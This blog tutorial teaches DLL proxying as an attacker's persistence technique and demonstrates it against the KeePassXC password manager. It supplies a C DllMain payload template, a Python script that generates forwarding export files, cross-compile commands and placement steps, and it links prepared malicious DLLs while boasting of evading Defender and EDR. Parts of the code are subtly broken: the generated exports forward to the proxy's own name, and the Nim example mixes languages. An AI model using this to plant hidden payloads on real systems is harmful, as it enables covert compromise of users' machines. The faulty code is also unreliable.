---
layout: post
title: DLL Proxying for Persistence - A Stealthy Technique
---

<img height="200" align="left" src="/images/dll_proxying_logo.jpeg">
Unlocking a loophole in Windows' DLL search order by using DLL Proxying to stealthily intercepts and redirects calls to forge persistence without raising suspicion. Exploiting this you as an attacker can nest malicious content within seemingly innocent DLLs. This tutorial shows you in depth how things are working out.

<br>
<br>

# Persistance by DLL Proxying

pre-requisites:
- [mingw-w64](http://mingw-w64.org/downloads)
- Python3
- Editor/IDE like Vim, VSCode, ...
- Optional: Nim if you like to try out new things


## DLL Proxying in a nutshell

Windows has a search order of predefined paths, for every application to look for required DLLs. This can be exploited by putting a malicious
DLL with the same name in the search path that contains malicious content and "proxying" the calls forward to the original DLL like shown below:
![](/images/dll_proxying.png)

This technique can be used by attackers to gain persistence or pivot this even to privilege escalation. Additional defensive evasion is possible and with some luck even bypass EDR tools.

Under some special conditions and configurations, it can be also used for
domain level privilege escalation or  remote code execution. 

### Let's get started

Before we can start, we need to be aware of two issues which are also important requirements for the crafted malicious replacement DLL:

1. To load correctly, a malicious DLL must export the functions required by the application, even if those functions are implemented as placeholders. Otherwise, both the application and the malicious DLL will fail to load.
2. If the malicious DLL exports the functions required by the application but does not implement them equivalently to the legitimate DLL, the application loads the DLL and probably executes the malicious code (e.g. in the `DllMain()` function), but afterwards the application crashes.

The solution for these two problems is DLL Proxying. Like shown above it is required to create a malicious DLL that exports all of the functions of the legitimate DLL. Now instead of
implementing the functions the malicious DLL just forwards the calls to the legitimate DLL.

Forging the DLL on this way ensures, that the application behaves normally without crashing and the execution of the malicious code can happen silently in the background.

## Creating the Proxy DLL

Let's assume that the target DLL whish should be proxied is called `target_original.dll` and the proxy DLL `target.dll`. 

With these assumptions it is possible to use a basic template for `payload.c`:

```c
#include <processthreadsapi.h>
#include <memoryapi.h>

void Payload()
{
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  
  char cmd[] = "calc.exe";
  
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));

  CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
      Payload();
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}
```

With this template we now require the definitions of the original export. This can be done during link-time by using
[Module-Definition (.def) files](https://docs.microsoft.com/en-us/cpp/build/reference/module-definition-dot-def-files?view=vs-2019)

This is luckily supported by the mingw-w64 cross-compiler tool set. In the `.def` file it is possible
to instruct the linker to use external references for the exported functions to the legitimate DLL file.

The [required syntax](https://docs.microsoft.com/en-us/cpp/build/reference/exports?view=vs-2019) for the `.def` file exports:

```bash
EXPORTS
  exported_name1=legitimate_dll_module.exported_name1 @ordinal1
  exported_name2=legitimate_dll_module.exported_name2 @ordinal2
  
  ... 
```

To generate the required `.def`-file it is required now to craft the export list of the legitimate DLL.
Extracting the export list can  be achieved by using the Python [pefile](https://github.com/erocarrera/pefile) > Portable Executable (PE) parser module . 

Here is a working script, but make sure to run `pip3 install pefile` before the execution of the script:
```python
import pefile

file_name = 'target'
dll = pefile.PE(f'{file_name}.dll')
  
exports = filter(lambda export: export.name is not None, dll.DIRECTORY_ENTRY_EXPORT.symbols)

formatted_exports = map(lambda export: '{0}={1}.{2} @{3}\n'.format(export.name.decode(), file_name, export.name.decode(), export.ordinal), exports)

with open(f'{file_name}.def', 'w') as file:
    file.write("EXPORTS\n")

    for formatted_export in formatted_exports:
        print(formatted_export, end='')
        file.write(f"{formatted_export}")
```

The output of this short script is the required `target.def` file for the mingw-w64 linker.

Now compiling and linking is trivial by using mingw-w64 cross-compiler (e.g. on Linux, targeting Windows 32-bit arch):

```bash
i686-w64-mingw32-gcc -shared -o target.dll payload.c target.def -s
```

and for Windows 64-bit arch:

```bash
x86_64-w64-mingw32-gcc -shared -o target.dll payload.c target.def -s
```

The resulted `target.dll` proxies all the function calls based on the exported functions to the legitimate `target_orig.dll`.

On this way, the application which depends on the original methods of `target.dll` is working normally. Additional it also executes the
`Payload()` function at initialization to run the malicious code.

Overall this technique is not new, but the approach still a neat way to gain persistance. For example you can use [windows-dll-hijacking/dll_hijacking_candidates.csv at master · wietze/windows-dll-hijacking (github.com)](https://github.com/wietze/windows-dll-hijacking/blob/master/dll_hijacking_candidates.csv) as a baseline and casual tools like Microsoft Teams, VS Code, KeePass etc. to gain persistance even after a reboot of the victim's machine.

## Enough talking - Time for tackling an Example

Since there are dozens of example starting from casual Windows dlls, over tools like Teams till browsers, and games. 

To make something different we use as the password manager KeePassXC as a baseline to show this technique (at point of testing, 30.12.2023, Microsoft Defender and EDR Tools were not reacting )

* **Get the binary here**: [KeePassXC 2.6.6 Portable (32-bit)](https://github.com/keepassxreboot/keepassxc/releases/download/2.6.0/KeePassXC-2.6.6-Win32-Portable.zip) 
* **Archived Code and dlls**: [HERE](/assets/posts/keepass.zip)

### Finding a suitable DLL 

As initial step we require a suitable DLL, to detect one in KeePass we can use [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/). With the proper settings like shown below:
![](/images/proc_mon_filter.png)

Set the filter like this:
* Column: `Path` "ends with" value `dll`
* Column: `Result` "is" value: `NAME NOT FOUND`
* Column: `Process Name "begins with" value. "KeePass"

If you ask yourself now: Why "NAME NOT FOUND"? Then it is a good idea now to check out the loading order of DLLs:

![](/images/dll_loading_order.png)

For more insights check out the  [official Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order). Based on this filter we now see that the Application's directory is checked before the Windows directories are accessed.

With those filters set we can now gain an overview that we now match with  [dll_hijacking_candidates.csv](https://github.com/wietze/windows-dll-hijacking/blob/master/dll_hijacking_candidates.csv  to find a potential DLL which is fitting for our attack:

![](/images/proc_mon_result.png)

Here the `KeePassXC.exe` app tries to load the library `userenv.dll`. Additional also `version.dll` is a good fit. To show that everything which is shown here is generic, you find a prepared `.dll` for both in the previous linked zipped archive.

Since KeePass can'f find both `.dll` in the current working directory we now need to check the original source. The easies way to find it is by simply searching for it `dir /s userenv.dll:
![](/images/cmd_search_userenv.png)

So we can simply copy the `userenv.dll` from the 
 `C:\Windows\SysWOW64` folder into the KeePass folder and save if as an example as `userenv_orig.dll`.

As a next step we need to generate the `userenv.def` file containing the export
redirection by the Python script shown above. The output will look like this:

```bash
EXPORTS
AreThereVisibleLogoffScripts=userenv.AreThereVisibleLogoffScripts @106
AreThereVisibleShutdownScripts=userenv.AreThereVisibleShutdownScripts @107
CreateAppContainerProfile=userenv.CreateAppContainerProfile @108
CreateEnvironmentBlock=userenv.CreateEnvironmentBlock @109
CreateProfile=userenv.CreateProfile @110
DeleteAppContainerProfile=userenv.DeleteAppContainerProfile @111
DeleteProfileA=userenv.DeleteProfileA @112
DeleteProfileW=userenv.DeleteProfileW @113
DeriveAppContainerSidFromAppContainerName=userenv.DeriveAppContainerSidFromAppContainerName @114
DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName=userenv.DeriveRestrictedAppContainerSidFromAppContainerSidAndRestrictedName @115
DestroyEnvironmentBlock=userenv.DestroyEnvironmentBlock @116
DllCanUnloadNow=userenv.DllCanUnloadNow @117
DllGetClassObject=userenv.DllGetClassObject @118
DllRegisterServer=userenv.DllRegisterServer @119
DllUnregisterServer=userenv.DllUnregisterServer @120
EnterCriticalPolicySection=userenv.EnterCriticalPolicySection @121
ExpandEnvironmentStringsForUserA=userenv.ExpandEnvironmentStringsForUserA @123
ExpandEnvironmentStringsForUserW=userenv.ExpandEnvironmentStringsForUserW @124
ForceSyncFgPolicy=userenv.ForceSyncFgPolicy @125
FreeGPOListA=userenv.FreeGPOListA @126
FreeGPOListW=userenv.FreeGPOListW @127
GenerateGPNotification=userenv.GenerateGPNotification @128
GetAllUsersProfileDirectoryA=userenv.GetAllUsersProfileDirectoryA @129
GetAllUsersProfileDirectoryW=userenv.GetAllUsersProfileDirectoryW @130
GetAppContainerFolderPath=userenv.GetAppContainerFolderPath @131
GetAppContainerRegistryLocation=userenv.GetAppContainerRegistryLocation @132
GetAppliedGPOListA=userenv.GetAppliedGPOListA @133
GetAppliedGPOListW=userenv.GetAppliedGPOListW @134
GetDefaultUserProfileDirectoryA=userenv.GetDefaultUserProfileDirectoryA @136
GetDefaultUserProfileDirectoryW=userenv.GetDefaultUserProfileDirectoryW @138
GetGPOListA=userenv.GetGPOListA @140
GetGPOListW=userenv.GetGPOListW @141
GetNextFgPolicyRefreshInfo=userenv.GetNextFgPolicyRefreshInfo @142
GetPreviousFgPolicyRefreshInfo=userenv.GetPreviousFgPolicyRefreshInfo @143
GetProfileType=userenv.GetProfileType @144
GetProfilesDirectoryA=userenv.GetProfilesDirectoryA @145
GetProfilesDirectoryW=userenv.GetProfilesDirectoryW @146
GetUserProfileDirectoryA=userenv.GetUserProfileDirectoryA @147
GetUserProfileDirectoryW=userenv.GetUserProfileDirectoryW @148
HasPolicyForegroundProcessingCompleted=userenv.HasPolicyForegroundProcessingCompleted @149
LeaveCriticalPolicySection=userenv.LeaveCriticalPolicySection @150
LoadProfileExtender=userenv.LoadProfileExtender @151
LoadUserProfileA=userenv.LoadUserProfileA @152
LoadUserProfileW=userenv.LoadUserProfileW @153
ProcessGroupPolicyCompleted=userenv.ProcessGroupPolicyCompleted @154
ProcessGroupPolicyCompletedEx=userenv.ProcessGroupPolicyCompletedEx @155
RefreshPolicy=userenv.RefreshPolicy @156
RefreshPolicyEx=userenv.RefreshPolicyEx @157
RegisterGPNotification=userenv.RegisterGPNotification @158
RsopAccessCheckByType=userenv.RsopAccessCheckByType @159
RsopFileAccessCheck=userenv.RsopFileAccessCheck @160
RsopLoggingEnabled=userenv.RsopLoggingEnabled @105
RsopResetPolicySettingStatus=userenv.RsopResetPolicySettingStatus @161
RsopSetPolicySettingStatus=userenv.RsopSetPolicySettingStatus @162
UnloadProfileExtender=userenv.UnloadProfileExtender @163
UnloadUserProfile=userenv.UnloadUserProfile @164
UnregisterGPNotification=userenv.UnregisterGPNotification @165
WaitForMachinePolicyForegroundProcessing=userenv.WaitForMachinePolicyForegroundProcessing @166
WaitForUserPolicyForegroundProcessing=userenv.WaitForUserPolicyForegroundProcessing @167
```

With the `.def` file we now need to craft our malicious `.dll` by  reusing the C code from above. To not make it too malicious in the beginning we are simply adding an example `Payload()` which is
launching `calc.exe`:

```c
#include <processthreadsapi.h>
#include <memoryapi.h>

void Payload()
{
  STARTUPINFO si;
  PROCESS_INFORMATION pi;
  
  char cmd[] = "calc.exe";
  
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  ZeroMemory(&pi, sizeof(pi));

  CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
  switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
      Payload();
      break;
    case DLL_THREAD_ATTACH:
      break;
    case DLL_THREAD_DETACH:
      break;
    case DLL_PROCESS_DETACH:
      break;
    }
  return TRUE;
}
```

Cross-compiling and linking the malicious Proxy DLL using mingw-w64:

```
i686-w64-mingw32-gcc -shared -o userenv.dll payload.c userenv.def -s
```

Copy the malicious `userenv.dll` proxy and the legitimate `userenv_orig.dll`
to the home folder of KeePassXC. 

Now launch `KeePassXC.exe` and the application behave normally and also execute the Payload by starting `calc.exe`

![](/images/payload_detonation.gif)

Still here? Alright lights try something different to create the payload. Since Nim has an awesome option called [Foreign Function Interface (FFI)](https://nim-lang.org/docs/manual.html#foreign-function-interface) we could also make use of it. Let's switch from C to Nim:


```python
import winrm, os

proc payload() =
  var si: STARTUPINFO
  var pi: PROCESS_INFORMATION

  let cmd = "calc.exe".toWideCString()

  zeroMemory(cast[ptr](&si), sizeof(si))
  si.cb = sizeof(si)
  zeroMemory(cast[ptr](&pi), sizeof(pi))

  createProcess(nil, cmd, nil, nil, false, 0, nil, nil, cast[ptr](&si), cast[ptr](&pi))

when isMainModule:
  proc dllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpReserved: LPVOID): BOOL {.stdcall.} =
    case fdwReason
    of DLL_PROCESS_ATTACH:
      payload()
    of DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH:
      discard
    result = true

  # Mimic WinAPI DLL loading process
  let hModule = cast[HINSTANCE](getModuleHandle(nil))
  let lpReserved = nil

  let result = dllMain(hModule, DLL_PROCESS_ATTACH, lpReserved)
  if result == false:
    echo "Payload execution failed"
```
